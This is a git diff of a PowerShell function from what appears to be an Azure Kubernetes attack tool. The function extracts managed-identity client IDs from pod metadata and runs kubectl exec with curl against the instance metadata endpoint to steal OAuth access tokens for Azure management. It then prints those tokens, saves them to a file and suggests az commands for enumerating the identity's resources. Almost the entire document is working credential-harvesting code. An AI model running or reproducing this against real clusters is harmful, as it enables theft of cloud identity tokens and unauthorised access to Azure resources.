@@ -86,7 +86,7 @@ Function Get-MetaDataInformation{
                 Write-Host "Writing metadata information to file"
                 # Get the script's directory
                 $filePath = Join-Path -Path $PSScriptRoot -ChildPath "metadataInformation${namespace}_${pod}.json"
-                $metadataData | Out-File -FilePath filePath
+                $metadataData | Out-File -FilePath "metadataInformation.txt"
 
                 #I want to filter items in the taglist these could contain pattenrs of serviceaccountID's
                 Write-Debug "Listing metadata $metadataData" 
@@ -98,24 +98,27 @@ Function Get-MetaDataInformation{
                 $matches = [regex]::Matches($possibleTargets, $pattern)
                 # Output each match
                 foreach ($match in $matches) {
+                    Write-Host enter foreach with $match.Value
                     $client_id=$match.Value
                     Write-Debug "url to test: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&client_id=&resource=https%3A%2F%2Fmanagement.azure.com%2F"
-                    $url= "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&client_id="+ $client_id + "&resource=https%3A%2F%2Fmanagement.azure.com%2F -H Metadata:true -s"
-                    $command = "curl $url"
+                    $command = "curl -s -H 'Metadata:true' 'http://169.254.169.254:80/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$client_id'"
+                    Write-Host $command
                     if ($PSBoundParameters.ContainsKey('accesstoken') -and $accesstoken) {
                         # If accesstoken is provided, pass it to the function
                         $IdentityMetadata = Perform-KubectlExecCommand -pod $pod -namespace $namespace -accesstoken $accesstoken -command $command
 
                     } else {
                         # If accesstoken is not provided, call the function without it
-                        $IdentityMetadata = Perform-KubectlExecCommand -pod $pod -namespace $namespace -command $command
+                        $IdentityMetadata = kubectl exec -it $pod -n $namespace --  curl -s -H 'Metadata:true' "http://169.254.169.254:80/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=${client_id}"
+                        Write-Host $IdentityMetadata
                     }
                     $access_token = $IdentityMetadata | jq .access_token | ForEach-Object { $_.Trim('"') }
-                    if ([string]::IsNullOrWhiteSpace($access_token)) {
+                    if ([string]::IsNullOrWhiteSpace($access_token) -or $access_token -eq "null") {
                         continue;
                     }
                     Write-Host "We found an access token printing below. This can be used to retrieve data through the azure cli" -ForegroundColor Green
                     $access_token
+                    $access_token | Out-File -FilePath "accesstoken_from_metadataInformation.txt"
 
                     Write-Host "validating access permissions"
                     # Example usage
@@ -140,6 +143,8 @@ Function Get-MetaDataInformation{
 
                     Write-Host "With the xms information you can also try to list te resource which belong to that managedIdenitty in azure With the following command" 
                     Write-Host "az identity list-resources --resource-group <ResourceGroupName> --name <ManagedIdentityName>"
+                    Write-Host "Exit function because of results found"
+                    exit;
                 }
             }
         } 
